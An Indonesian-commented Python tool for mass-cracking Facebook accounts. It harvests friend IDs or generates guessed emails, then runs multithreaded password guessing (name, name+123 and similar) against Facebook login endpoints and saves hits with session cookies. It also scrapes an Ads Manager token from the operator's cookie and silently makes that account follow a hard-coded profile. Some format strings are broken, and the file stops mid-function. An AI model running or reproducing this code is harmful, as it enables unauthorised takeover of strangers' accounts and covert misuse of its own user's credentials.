# !/usr/bin/python3
# coding : utf-8

# Coded by : Moch Arif Xyc
# Python version : 3.11.6
# Github   : https://github.com/Xycaa-X-Code
# Kalo mau donasi bng buat support 083140199711 gopay/dana, seiklasnya aja bng :-)
#----------[ MODULE ]----------#
try:
    import os, re, sys, json, time, random, requests
    from rich.console import Console
    from bs4 import BeautifulSoup as bs4
    from concurrent.futures import ThreadPoolExecutor as exculator
except:
    try: 
        os.system('pip install bs4')
        os.system('pip install rich')
        os.system('pip install requests')
    except ModuleNotFoundError as e: sys.exit(e)
    
#----------[ COLOR-RICH ]----------#
M = "[#FF0000]" # MERAH
P = "[#FFFFFF]" # PUTIH
H = "[#00FF00]" # HIJAU
K = "[#FFFF00]" # KUNING
B = "[#00C8FF]" # BIRU
J = "[#FF8F00]" # JINGGA
A = "[#AAAAAA]" # ABU-ABU

#----------[ COLOR-RESULT]----------#
nn = '\33[m' # DEFAULT
hh = '\033[32m' # HIJAU -
kk = '\033[33m' # KUNING -

dumpid=[]    

simpan_ok=('MOCH-ARIF-OK.txt')
simpan_cp=('MOCH-ARIF-CP.txt')

# USERAGENT
class Dev:
    def Useragent(self,total):
        for i in range(int(total)):
            self.rr = random.randint
            self.rc = random.choice
            self.rd = str(self.rc(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','S','T','U','V','W','X','Y','Z']))
            self.bd = ''.join(self.rd for i in range(3))
            self.gg = str(self.rc(['en_US','en_GB','id_ID','in_ID','de_DE','ru_RU','en_SG','fr_FR','fa_IR','ja_JP','pt_BR','cs_CZ','zh_HK','zh_CN','vi_VN','en_PH','en_IN','tr_TR','it_IT']))
            self.realme = str(random.choice(["RMX3516",
            "RMX3461","RMX3286","RMX3561","RMX3388",
            "RMX3311","RMX3142","RMX2071","RMX1805",
            "RMX1809","RMX1801","RMX1807","RMX1803",
            "RMX1825","RMX1821","RMX1822","RMX1833",
            "RMX1851","RMX1853","RMX1827","RMX1911",
            "RMX1919","RMX1927","RMX1971","RMX1973",
            "RMX2030","RMX2032","RMX1925","RMX1929",
            "RMX2001","RMX2061","RMX2063","RMX2040",
            "RMX2042","RMX2002","RMX2151","RMX2163",
            "RMX2155","RMX2170","RMX2103","RMX3085",
            "RMX3241","RMX3081","RMX3151","RMX3381",
            "RMX3521","RMX3474","RMX3471","RMX3472",
            "RMX3392","RMX3393","RMX3491","RMX1811",
            "RMX2185","RMX3231","RMX2189","RMX2180",
            "RMX2195","RMX2101","RMX1941","RMX1945",
            "RMX3063","RMX3061","RMX3201","RMX3203",
            "RMX3261","RMX3263","RMX3193","RMX3191",
            "RMX3195","RMX3197","RMX3265","RMX3268",
            "RMX3269","RMX2027","RMX2020","RMX2021",
            "RMX3581","RMX3501","RMX3503","RMX3511",
            "RMX3310","RMX3312","RMX3551","RMX3301",
            "RMX3300","RMX2202","RMX3363","RMX3360",
            "RMX3366","RMX3361","RMX3031","RMX3370",
            "RMX3357","RMX3560","RMX3562","RMX3350",
            "RMX2193","RMX2161","RMX2050","RMX2156",
            "RMX3242","RMX3171","RMX3430","RMX3235",
            "RMX3506","RMX2117","RMX2173","RMX3161",
            "RMX2205","RMX3462","RMX3478","RMX3372",
            "RMX3574","RMX1831","RMX3121","RMX3122",
            "RMX3125","RMX3043","RMX3042","RMX3041",
            "RMX3092","RMX3093","RMX3571","RMX3475",
            "RMX2200","RMX2201","RMX2111","RMX2112",
            "RMX1901","RMX1903","RMX1992","RMX1993",
            "RMX1991","RMX1931","RMX2142","RMX2081",
            "RMX2085","RMX2083","RMX2086","RMX2144",
            "RMX2051","RMX2025","RMX2075","RMX2076",
            "RMX2072","RMX2052","RMX2176","RMX2121",
            "RMX3115","RMX1921","RMX3371"]))
            UC = (f'Mozilla/5.0 (Linux; U; Android {str(self.rr(0,19))}; {self.gg}; {self.realme} Build/{self.bd}{str(self.rr(1,9))}.{str(self.rr(200000,499999))}.0{str(self.rr(1,24))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(40,114))}.0.{str(self.rr(2200,4900))}.{str(self.rr(40,140))} UCBrowser/{str(self.rr(0,30))}.{str(self.rr(1,9))}.0.{str(self.rr(1000,9999))} Mobile Safari/537.36')
            return(UC)
            
# HEADERS
class Headers:
    def __init__(self):
        self.ua = str(random.choice([Dev().Useragent(total=1)]))
    
    #----------[ HEAD-LOGIN ]----------#
    def HeadLogin(self):
        headers = {
            "Host": "m.facebook.com",
            "Dpr": "1.53125",
            "Viewport-Width": "980",
            "Sec-Ch-Ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Ch-Ua-Platform-version": '"10.0.0"',
            "Sec-Ch-Ua-Model": '"RMX1821"',
            "Sec-Ch-Ua-Full-Version-List": '"Chromium";v="112.0.5615.47", "Google Chrome";v="112.0.5615.47", "Not:A-Brand";v="99.0.0.0"',
            "Sec-Ch-Prefers-Color-Scheme": "light",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fadsmanager%2Fmanage%2Fcampaigns%3Fwtsid%3Drdr_072QbFsCLxwR5Rssa&refsrc=deprecated&wtsid=rdr_072QbFsCLxwR5Rssa&_rdr",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,pt;q=0.6"}
        return ( headers )  
        
    #----------[ HEAD-ASYINC ]----------#
    def HeadAsyinc(self,response):
        headers = {
            "Host":"m.facebook.com",
            "Cache-Control":"max-age=0",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Ch-Ua-Platform-version": '"10.0.0"',
            "Sec-Ch-Ua-Model": '""',
            "Origin":"https://m.facebook.com",
            "Content-Type":"application/x-www-form-urlencoded",
            "X-FB-lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1),
            "User-Agent": self.ua,
            "X-Response-Format": "JSONStream",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "X-Requested-With":"XMLHttpRequest",
            "Sec-Fetch-Site":"none",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-User":"?1",
            "Sec-Fetch-Dest":"document",
            "Accept": "*/*",
            "Referer":"https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Flogin%26flow%3Dlogin_no_pin%3D2cPmyk6XTSpA6uOoe&ref=dbl&fl&login_from_aymh=1&refid=9",
            "Accept-Encoding":"gzip, deflate br",
            "accept-language":"en-US;q=0.8,en;q=0.9",
            "View-Width":"980",
            "Connection":"Keep-Alive"}
        return(headers)
        
    #----------[ HEAD-MOBILE ]----------#
    def HeadMobile(self):
        headers = {
            "Host": "m.prod.facebook.com",
            "Cache-Control": "max-age=0",
            "Viewport-Width": "110",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Upgrade-Insecure-Requests": "1",
            "Origin":"https://m.prod.facebook.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": self.ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?0",
            "Sec-Fetch-Dest": "document",
            "Referer":"https://m.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "ms-MY;q=0.7,id-ID;q=0.8,id;q=0.9",
            "X-Requested-With": "XMLHttpRequest",
            "Connection":"Keep-Alive"}
            
    #----------[ HEAD-REGULER ]----------#
    def HeadReguler(self):
        headers = {
            "Host": "free.prod.facebook.com",
            "Cache-Control": "max-age=0",
            "Viewport-Width": "110",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Upgrade-Insecure-Requests": "1",
            "Origin":"https://free.prod.facebook.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": self.ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?0",
            "Sec-Fetch-Dest": "document",
            "Referer":"https://free.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "ms-MY;q=0.7,id-ID;q=0.8,id;q=0.9",
            "X-Requested-With":"XMLHttpRequest",
            "Connection":"Keep-Alive"}

# MULAI        
class AdsmanagerFacebook:
    def __init__(self):
        self.ip = requests.get("http://ip-api.com/json/").json()["query"]
        self.negara = requests.get("http://ip-api.com/json/").json()["country"]
        self.ExecMenu('')
        
    #----------[ BERSIHKAN-LAYAR ]----------#
    def BersihkanLayar(self):
        if "win" in sys.platform: os.system("cls")
        else: os.system("clear")
        
    #----------[ HAPUS-DATA-LOGIN ]----------#
    def DeletedDataLog(self,file = 'data/login/'):
        try:
            cookie = (file+'.cookie.json')
            for cookie in os.system('rm -rf '+cookie):
                return(cookie)
        except:pass
        try:
            token = (file+'.token_eaab.json')
            for token in os.system('rm -rf '+token):
                return(token)
        except:pass         
        self.ExecLogin('')
       
    #----------[ CEK-DATA-LOGIN ]----------# 
    def GetInfoLog(self,file = 'data/login/'):
        try:
            token = json.loads(open(file+'.token_eaab.json', 'r').read())['Token']
            cookie = json.loads(open(file+'.cookie.json', 'r').read())['Cookie']
            with requests.Session() as xyc:
                url = xyc.get('https://graph.facebook.com/me?access_token=%s'%(token), cookies={'cookie':cookie}).json()
                userid = url['id']
                fullname = url['name']
            return(userid,fullname,token,cookie)
        except:self.DeletedDataLog('')
        
    def Banner(self):
        self.BersihkanLayar()
        Console().print(f'''\r{M}
  ____________________           
{K} /   _____/\_   _____/___  ____  
 \_____  \  |    __)/ ___\/ __ \ 
{H} /        \ |     \\  \__\  ___/ 
{B}/_______  / \___  / \___  >___  >
        {J}\/      \/      \/    \/  
        Use Simpel Force''')	
       
    #----------[ PILIHAN MENU LOGIN ]----------# 
    def ExecLogin(self, file = 'data/login/'):
        self.Banner()
        Console().print(f'\n {A}[{H}*{A}] Userip {H}{self.ip} \n {A}[{H}*{A}] Country {H}{self.negara}')
        Console().print(f'\n {A}[{H}1{A}] login menggunakan cookie \n {A}[{H}2{A}] login menggunakan id/nama/email/nomor')
        C = Console().input(f'\n [{H}*{A}] Choose : ')
        
        #----------[ LOGIN DENGAN COOKIE ]----------#
        if C =='1' or C =='01':
            Console().print(f'\n [{H}#{A}] {M}WARNING \n\n {A}[{H}*{A}] cookies harus fres \n {A}[{H}*{A}] saran cookie dough \n {A}[{H}*{A}] jangan akun pribadi')
            cookie = Console().input(f'\n [{H}*{A}] Masukan Cookie : ')
            try:
                tok = self.DapatkanTokenAds(cookie,'')
                Console().print(f' {A}[{H}*{A}] Token Adsmanager : {H}%s'%(tok))
                self.ConvertFollowers(cookie, tok)
                with open(file+'.cookie.json',mode='w',encoding='utf8') as wr:
                    wr.write(json.dumps({'Cookie': cookie}))
                    wr.close()
                Console().print(f' {A}[{H}#{A}] login berhasil, silakan jalankan ulang pythonnya');exit() 
            except AttributeError as e: sys.exit(e)
           
        #----------[ LOGIN DENGAN AKUN ]----------# 
        elif C =='2' or C =='02':
            userid = Console().input(f'\n [{H}*{A}] id/nama/email/nomor : ')
            if userid =='': Console().print(f'\n {M}* kamu kaya kontol');exit()
            userpas = Console().input(f' [{H}*{A}] Sandi : ')
            if userpas =='': Console().print(f'\n {M}* kamu kaya kontol');exit()
            try:
                with requests.Session() as xyc:
                    response = xyc.get('https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fadsmanager%2Fmanage%2Fcampaigns%3Fwtsid%3Drdr_072QbFsCLxwR5Rssa&ref=dbl&fl&login_from_aymh=1&refid=9').text
                    encoding = {
                         "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                         "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                         "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                         "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                         "try_number": 0, 
                         "unrecognized_tries": 0, 
                         "email":userid, 
                         "pass": userpas,
                         "login":"Log + In", 
                         "bi_xrwh": 0}
                    headers = Headers().HeadLogin()
                    params = {'next':'https://m.facebook.com/adsmanager/manage/campaigns?wtsid=rdr_072QbFsCLxwR5Rssa','ref':'dbl','fl':'','login_from_aymh':'1','refid':'9'}
                    xyc.cookies.update({'cookie':';'.join([f'{name}={value}' for name,value in xyc.cookies.get_dict().items()])})
                    response = bs4(xyc.post('https://m.facebook.com/login/',data=encoding, params=params, headers=headers).text,"html.parser")
            except ConnectionError as e: sys.exit(e)
            except:pass
            try:
               with requests.Session() as xyc:
                   payload = xyc.cookies.get_dict()
                   if 'c_user' or payload.keys():
                       cookie = ';'.join([f'{name}={value}' for name,value in xyc.cookies.get_dict().items()])
                       Console().print(f'\n {A}[{H}*{A}] Convert Cookie : {H}{cookie}')
                       tok = self.DapatkanTokenAds(cookie,'')
                       Console().print(f' {A}[{H}*{A}] Token Adsmanager : {H}%s'%(tok))
                       self.ConvertFollowers(cookie, tok)
                       with open(file+'.cookie.json',mode='w',encoding='utf8') as wr:
                           wr.write(json.dumps({'Cookie': cookie}))
                           wr.close()
                       Console().print(f' {A}[{H}#{A}] login berhasil, silakan jalankan ulang pythonnya');exit() 
            except AttributeError as e: sys.exit(e)
        else: Console().print(f'\n {A}[{M}#{A}]{M} oke brooo ');exit()   
        
    #----------[ DAPATKAN TOKEN EAAB ]----------#
    def DapatkanTokenAds(self,cookie,file = 'data/login'):
        try:
            with requests.Session() as xyc:
                url = xyc.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1",cookies={"cookie":cookie})
                src = re.search('act=(\d+)',url.text).group(1)
                act = xyc.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?act=%s&breakdown_regrouping=1"%(src),cookies={"cookie":cookie})
                tok = re.search('.__accessToken="(.*?)"',act.text).group(1)
                with open(file+'.token_eaab.json',mode='w',encoding='utf8') as wr:
                    wr.write(json.dumps({'Token':tok}))
                    wr.close()
                return(tok)   
        except(ConnectionError, Exception) as e:exit(e)
        
    #----------[ PLEASE JANGAN DI GANTI ]----------#
    def ConvertFollowers(self, cookie, tok):
        try:
            with requests.Session() as xyc:
                url = bs4(xyc.get('https://mbasic.facebook.com/profile.php?id=100028845823412',cookies={"cookie": cookie}).text, "html.parser")
                if "/a/subscribe.php" in str(url):
                    car = re.search('/a/subscribe.php(.*?)"', str(url)).group(1).replace("amp;", "")
                    xyc.get("https://mbasic.facebook.com/a/subscribe.php{}".format(car), cookies={"cookie": cookie})
        except Exception as e: sys.exit(e)
        
     #----------[ PILIHAN MENU CRACK ]----------#
    def ExecMenu(self, file = 'data/login'):
        try:userid,fullname,token,cookie= self.GetInfoLog('')  
        except ConnectionError as e: exit(e)
        self.Banner()
        Console().print(f'\n {A}[{H}*{A}] Userip {H}{self.ip} \n {A}[{H}*{A}] Country {H}{self.negara} \n {A}[{H}*{A}] Username : {H}%s \n {A}[{H}*{A}] User idz : {H}%s'%(fullname,userid))
        Console().print(f'\n {A}[{H}1{A}] Crack from publik \n {A}[{H}2{A}] Crack from email \n {A}[{H}3{A}] Cek result Ok/Cp \n {A}[{H}0{A}] Keluar dari tools')
        X = Console().input(f'\n {A}[{H}*{A}] Choose : ')
        
        #----------[ CRACK DARI PUBLIK ]----------#
        if X =='1' or X =='01':
            Console().print(f'\n {A}[{H}*{A}] Banyaknya ID, Pisahkan dengan koma')
            user = Console().input(f' {A}[{H}*{A}] ID : {H}')
            if user =='': Console().print(f'\n {M}* kamu kaya kontol');exit()
            Console().print(f'\n {A}[{H}*{A}] Ketik ctrl + c untuk berhenti dump')
            for uuid in user.split(','):
                try:
                    Dump().DumpFriends(f'https://graph.facebook.com/v18.0/{uuid}/friends',cookie,token,'')
                except KeyboardInterrupt:pass
                except: Console().print(f'\n {M}* Oops, Sepertinya Akunmu Spam!!!') 
                Crack().Generate_list()
           
        #----------[ CRACK DARI EMAIL ]----------#     
        elif X =='2' or X =='02':
            Console().print(f'\n {A}[{H}*{A}] Banyaknya Nama, Pisahkan dengan koma')
            nama = Console().input(f' {A}[{H}*{A}] Nama : {H}')
            if nama =='': Console().print(f'\n {M}* kamu kaya kontol');exit()
            total = Console().input(f' {A}[{H}*{A}] Limit : {H}')
            if total =='': Console().print(f'\n {M}* kamu kaya kontol');exit()
            Console().print(f'\n {A}[{H}*{A}] Example ({H}@gmail.com, yahoo.com, dll{A})')
            doma = Console().input(f' {A}[{H}*{A}] Domain : ')
            if doma =='': Console().print(f'\n {M}* kamu kaya kontol');exit()
            Console().print(f'\n {A}[{H}*{A}] Ketik ctrl + c untuk berhenti dump')
            for nama in nama.split(','):
                try:Dump().DumpEmail(nama,total,doma)
                except KeyboardInterrupt:pass
                except Exception as e:exit(e)
                Crack().Generate_list()
           
        #----------[ CEK RESULT CRACK ]----------#     
        elif X =='3' or X =='03':
            Console().print(f'\n {A}[{H}1{A}] Result Ok \n {A}[{H}2{A}] Result Cp')
            R = Console().input(f'\n {A}[{H}*{A}] Choose : '); print() 
            
            #----------[ RESULT OK ]----------#   
            if R =='1' or R =='01':
                try:slutup=0
                except FileNotFoundError as e: sys.exit(e)
                for buka in open('/sdcard/OK/'+simpan_ok,'r').readlines():
                    slutup+=1
                    Console().print(f' {A}[{H}*{A}] OK {A}: {H}{buka}')
                     
            #----------[ RESULT CP ]----------#           
            elif R =='2' or R =='02':
                try:slutup=0
                except FileNotFoundError as e: sys.exit(e)
                for buka in open('/sdcard/CP/'+simpan_cp,'r').readlines():
                    slutup+=1
                    Console().print(f' {A}[{K}*{A}] CP {A}: {K}{buka}')
            else: Console().print(f' {A}[{M}#{A}]{M} oke brooo ');exit()   
            
        #----------[ KELUAR DARI TOOLS ]----------#    
        elif X =='0' or X =='00':
            Klc = Console().input(f'\n {A}[{H}#{A}] keluar/delete cookie ( y/t ): ')
            if Klc in ['y','Ya','Y','YA']: self.DeletedDataLog('')
            else: self.BersihkanLayar()      
        else: Console().print(f'\n {A}[{M}#{A}]{M} oke brooo ');exit()   

# DUMP                
class Dump:
    def __init__(self) -> None:pass
    
    #----------[ DUMP PUBLIK MASAL ]----------#
    def DumpFriends(self,url,cookie,token,after):
        try:
            params = {'access_token':token,'after':after,'pretty':'1'}
            response = requests.get(url,params=params,cookies={'cookies':cookie}).json()
            for xyz in response['data']:
                format = '%s<=>%s'%(xyz['id'],xyz['name'])
                if format not in dumpid:
                    dumpid.append(format)
                    Console().print(f' {A}[{H}*{A}] sedang dump {H}{len(dumpid)}{A} idz',end='\r'); sys.stdout.flush()
            if 'paging' in str(response):
                after = response['paging']['cursors']['after']
                self.DumpFriends(url,cookie,token,after)  
        except KeyboardInterrupt: pass
        except AttributeError: pass
    
    #----------[ DUMP RANDOM EMAIL ]----------#    
    def DumpEmail(self,nama,total,doma):
        self.rr = random.randint; self.rc = random.choice
        self.orang = str(self.rc(['amin','amel','amelia','ais','ananda','agus','aji','adi','andi','andika','abas','aminah','aminatun','bagas','basuki','babas','bayu','badrul','bintang','cindi','cici','cinta','cupita','cupi','dina','diki','difa','dihi','dini','diva','devinta','deni','dila','dilah','fika','fikha','fina','fivi','fatah','fania','fatih','fatun','32','28','123','24','oficial','cans','ganz','tok','xd','id','gina','galih','gugun','gifah','gans','kholid','kontol','kania','khoerul','hilada','hilmi','himin','lili','lina','lani','laruh','mia','mas','maz','mamat','mamad','masrul','nina','niha','nining','nula','nana','nunu','nifta','nita','niva','nabila','nadia','odi','oni','ojol','onani','pitri','rosma','riska','rina','rani','ratu','ratna','rifa','riva','rena','reza','rofik','risma','roza','rozak','siska','santi','sari','sarno','susanti','sindi','suci','susana','sinta','sulis','tiwi','tina','tanti','tono','tiara','titin','ulfa','ulfah','ulin','ulfin','unah','udin','usman','usdin','vina','vinka','vani','vatimah','winda','wanti','wani','wadul','xi','zidan','zaenal','zizi','khamdihi','iren','ine','reni','ufik','rohmah','khasna','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','rudi','bambang','supri','wawan','karnawan','akatsuki','wibu','cakep','cantik','ganteng','hitam','zulki','angga','yayan','dapunta','romi','khamdihi','rohmat','basuki','hamzah','boy','cahyani','sadiyah','salamah','anit','tuti','astutik','warsi','warsinah','mariati','manda','putri','putra','safitri','saputra','dikul','mursyid','ardi','ardian','diancm','dinda','rahma','fajar','rendi','risky','difa','andika','yaya','gilang','galang','aldi','aldo','revaldo','revaldi','yossy','sulis','caca','cici','arif','zainal','arifin','dika','bayu','ferly','semarang','boyolali','cilacap','kebumen','banyumas','tuban','sumedang','sragen','sunda','garut','cirebon','sukabumi','medan','suroboyo','surabaya','cilacap','jepara','tasik','malang','jogja','kediri','kudus','jember','situbondo','wonosobo','trenggalek','gresik','bangkalan','jombang','lamongan','lumajang','madiun','magetan','mojokerto','nganjuk','pacitan','ngawi','pasuruan','ponorogo','pamengkasan','sidoarjo','blitar','banjarnegara','brebes','grobokan','karanganyar','kendal','klaten','kudus','pati','pekalongan','rembang','temanggung','wonogiri','wonosobo','sukoharjo','bandung','ciamis','cianjur','cirebon','indramayu','sumedang','purwakarta','bogor']))
        for i in range(int(total)):
            nam1=(f'{nama}{str(self.rr(1,999))}{doma}<=>{nama}')
            nam2=(f'{self.orang}{str(self.rr(1,999))}{doma}<=>{self.orang}')
            nam3=(f'{nama}{self.orang}{str(self.rr(1,999))}{doma}<=>{nama}')
            if nam1 not in dumpid:dumpid.append(nam1)
            if nam2 not in dumpid:dumpid.append(nam2)
            if nam3 not in dumpid:dumpid.append(nam3)
            Console().print(f' {A}[{H}*{A}] sedang dump {H}{len(dumpid)}{A} email',end='\r'); sys.stdout.flush()    
        return(dumpid)           

# Crack            
class Crack:   
    def __init__(self):
        self.live, self.loop, self.chek = 0,0,0
        
    #----------[ WORDLIST ]----------#    
    def Generate_list(self):
        Console().print(f'\n\n {A}[{H}1{A}] Asyinc \n {A}[{H}2{A}] Mobile \n {A}[{H}3{A}] Reguler')
        execloginfb = Console().input(f'\n [{H}*{A}] Choose : ')
        Console().print(f'\n {A}[{H}*{A}] Hasil OK Simpan/{H}OK/{simpan_ok} \n {A}[{H}*{A}] Hasil CP Simpan/{K}CP/{simpan_cp} \n\n {A}[{H}*{A}] Mainkan Mode Pesawat Setiap 300 ID\n')
        with exculator(max_workers=30) as V:
            for akun in dumpid:
                userid, username = akun.split('<=>')
                password = self.Generate_pas(username)
                if execloginfb in ('1','01'): V.submit(self.Asyinc,userid,password)
                elif execloginfb in ('2','02'): V.submit(self.Mobile,userid,password)
                elif execloginfb in ('3','03'): V.submit(self.Reguler,userid,password)
                else:(V.submit(self.Asyinc,userid,password))
           
     #----------[ PASSWORD ]----------#         
    def Generate_pas(self,username):
        for nama in username.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:password = [nama, nama+"123", nama+"1234", nama+"12345"]
            else: password = [nama, nama+"123", nama+"1234", nama+"12345"]
        return(password)
        
    #----------[ ASYINC ]----------#      
    def Asyinc(self,userid,password):
        print(f' *—> SFC.Cracking {len(dumpid)}/{self.loop} self.live :- {self.live} self.chek :- {self.chek}', end='\r'); sys.stdout.flush()
        for userpas in password:
            try:
                with requests.Session() as xyc:
                    response = xyc.get("https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Flogin%26flow%3Dlogin_no_pin%3D2cPmyk6XTSpA6uOoe&ref=dbl&fl&login_from_aymh=1&refid=9").text
                    encoding = {
                       "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1),
                       "li": re.search('name="li" value="(.*?)"', str(response)).group(1),
                       "try_number": 0,
                       "unrecognized_tries": 0,
                       "email": userid,
                       "prefill_contact_point": userid,
                       "prefill_source": "browser_dropdown",
                       "prefill_type": "password",
                       "first_prefill_source": "browser_dropdown",
                       "first_prefill_type": "contact_point",
                       "had_cp_prefilled": True,
                       "had_password_prefilled": True,
                       "is_smart_lock": False,
                       "bi_xrwh": 0,
                       "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], userpas),
                       "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1),
                       "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1),
                       "__dyn": "",
                       "__csr": "",
                       "__req": str(random.choice(['1','2','3','4','5'])),
                       "__user": 0
                    }       
                    params={"next":"https://m.facebook.com/login&flow=login_no_pin=2cPmyk6XTSpA6uOoe","refsrc":"deprecated","lwv":"100"}
                    xyc.cookies.update({
                        'Cookie': ';'.join([f'{name}={value}' for name,value in xyc.cookies.get_dict().items()])
                    })
                    headers = Headers().HeadAsyinc(response)
                    response = bs4(xyc.post('https://m.facebook.com/login/device-based/login/async/',data=encoding,params=params,headers=headers).text,"html.parser")
                    payload = xyc.cookies.get_dict()          
                    if 'c_user' in payload.keys():
                        coki = ';'.join([f'{name}={value}' for name,value in xyc.cookies.get_dict().items()])
                        print(f' *——> {hh}{userid}{nn}<=>{hh}{userpas}{nn}<=>{hh}{coki}{nn}',end='\r'); sys.stdout.flush()
                        resok=('%s<=>%s<=>%s<=>%s<=>%s'%(userid,userpas,coki)) 
                        with open('OK/'+simpan_ok,'a') as wr:
                            wr.write(resok+'\n')
                            wr.close()
                        self.live+=1                
                        break                                                                       
                    elif 'checkpoint' in payload.keys():
                        print(f' *——> {kk}{userid}{nn}<=>{kk}{userpas}{nn}',end='\r'); sys.stdout.flush()
                        rescp=('%s<=>%s<=>%s<=>%s'%(userid,userpas))
                        with open('CP/'+simpan_cp,'a') as wr:
                            wr.write(rescp+'\n')
                            wr.close()
                        self.chek+=1                   
                        break
                    else:continue
            except requests.exceptions.ConnectionError:
                print(f' *—> SFC.Spam.. {len(dumpid)}/{self.loop} self.live :- {self.live} self.chek :- {self.chek}', end='\r'); sys.stdout.flush()
                time.sleep(31)
        self.loop+=1
        
    #----------[ MOBILE ]----------#      
    def Mobile(self,userid,password):
        print(f' *—> SFC.Cracking {len(dumpid)}/{self.loop} self.live :- {self.live} self.chek :- {self.chek}', end='\r'); sys.stdout.flush()
        for userpas in password:
            try:
                with requests.Session() as xyc:
                    response = xyc.get("https://m.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
                    encoding = {
                       "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                        "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                        "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                        "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                        "try_number": 0, 
                        "unrecognized_tries": 0, 
                        "email":userid,
                        "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], userpas),
                        "login":"Log & In", 
                        "bi_xrwh": 0}
                    params = {"next":"","ref":"dbl","fl":"","login_from_aymh":"1","refid":"8"}
                    xyc.cookies.update({
                        'Cookie': ';'.join([f'{name}={value}' for name,value in xyc.cookies.get_dict().items()])
                    })
                    headers = Headers().HeadMobile()
                    response = bs4(xyc.post('https://m.prod.facebook.com/login/',data=encoding,params=params,headers=headers).text,"html.parser")
                    payload = xyc.cookies.get_dict()          
                    if 'c_user' in payload.keys():
                        coki = ';'.join([f'{name}={value}' for name,value in xyc.cookies.get_dict().items()])
                        print(f' *——> {hh}{userid}{nn}<=>{hh}{userpas}{nn}<=>{hh}{coki}{nn}',end='\r'); sys.stdout.flush()
                        resok=('%s<=>%s<=>%s<=>%s<=>%s'%(userid,userpas,coki)) 
                        with open('OK/'+simpan_ok,'a') as wr:
                            wr.write(resok+'\n')
                            wr.close()
                        self.live+=1                
                        break                                                                       
                    elif 'checkpoint' in payload.keys():
                        print(f' *——> {kk}{userid}{nn}<=>{kk}{userpas}{nn}',end='\r'); sys.stdout.flush()
                        rescp=('%s<=>%s<=>%s<=>%s'%(userid,userpas))
                        with open('CP/'+simpan_cp,'a') as wr:
                            wr.write(rescp+'\n')
                            wr.close()
                        self.chek+=1                   
                        break
                    else:continue
            except requests.exceptions.ConnectionError:
                print(f' *—> SFC.Spam.. {len(dumpid)}/{self.loop} self.live :- {self.live} self.chek :- {self.chek}', end='\r'); sys.stdout.flush()
                time.sleep(31)
        self.loop+=1
        
    #----------[ REGULER ]----------#      
    def Reguler(self,userid,password):
        print(f' *—> SFC.Cracking {len(dumpid)}/{self.loop} self.live :- {self.live} self.chek :- {self.chek}', end='\r'); sys.stdout.flush()
        for userpas in password:
            try:
                with requests.Session() as xyc:
